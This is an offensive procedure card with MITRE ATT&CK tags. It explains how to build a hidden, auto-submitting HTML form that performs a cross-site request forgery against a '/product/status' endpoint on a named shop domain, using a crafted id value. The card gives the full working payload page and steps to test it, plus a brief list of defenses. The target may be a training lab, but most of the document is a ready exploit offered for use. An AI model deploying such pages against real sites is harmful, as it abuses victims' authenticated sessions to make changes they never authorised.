---
id: proc-uuid-4
name: Create-CSRF-Malicious-Webpage
tags:
  - csrf
  - html
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:15.661Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-CSRF-Malicious-Webpage

## Summary

This procedure creates a simple HTML webpage that automatically submits a POST form to the vulnerable `/product/status` endpoint using the crafted ID, exploiting the lack of anti-CSRF tokens.

## Description

Since the endpoint accepts POSTs with only an `id` parameter and no origin checks, a hidden form on a malicious page can abuse the victim's authenticated session to change product status when loaded.

## Requirements

1. Crafted malicious ID from previous step
2. Text editor to write HTML
3. Web server or file hosting to serve the page (or data URI for testing)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing POST endpoints
- Use SameSite cookies and frame-busting headers
- Monitor for cross-origin POSTs to sensitive endpoints

## Objectives

1. Build an auto-submitting form targeting the endpoint
2. Hide the form to make it invisible to the victim
3. Ensure submission on page load

## Instructions

### Step 1: Write HTML Form

**Context**: Create a basic form with hidden input for the ID.

No command; use text editor to save as `csrf.html`:

```html
<!DOCTYPE html><html><body><form action="https://www.digitalsellz.com/product/status" method="POST" id="csrfForm"><input type="hidden" name="id" value="QUEjNDgxNSNBQQ" /></form><script>document.getElementById('csrfForm').submit();</script></body></html>
```

> The script triggers submission on load; alternatively use `onload` on form.

### Step 2: Test Page Locally

**Context**: Open the HTML file in a browser to verify auto-submit.

No command; load file:// path and check network tab for POST.

> Expected: Immediate POST to endpoint with ID parameter.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[html]]
- [[web]]
